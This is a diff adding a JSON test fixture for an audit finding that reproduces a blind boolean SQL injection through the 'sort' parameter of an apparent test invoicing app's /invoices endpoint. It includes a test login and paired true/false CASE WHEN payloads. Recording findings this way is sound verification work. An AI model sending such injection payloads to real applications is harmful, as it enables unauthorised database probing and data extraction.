@@ -1,0 +1,6 @@
+{"finding": "F-6",
+ "description": "Blind boolean injection in ORDER BY: the condition decides whether rows sort by amount (INV-1002, 450.5, first) or by number (INV-1001 first). Read-only.",
+ "steps": [{"name": "login as alice", "method": "POST", "path": "/login", "form": {"email": "alice@example.test", "password": "alice-test-pw"}, "expect_status": 302},
+   {"name": "true condition", "method": "GET", "path": "/invoices", "params": {"sort": "CASE WHEN (1=1) THEN amount ELSE number END"}},
+   {"name": "false condition", "method": "GET", "path": "/invoices", "params": {"sort": "CASE WHEN (1=2) THEN amount ELSE number END"}}],
+ "proof": {"type": "boolean_diff", "true_step": "true condition", "false_step": "false condition", "marker": "[{\"amount\":450.5"}}
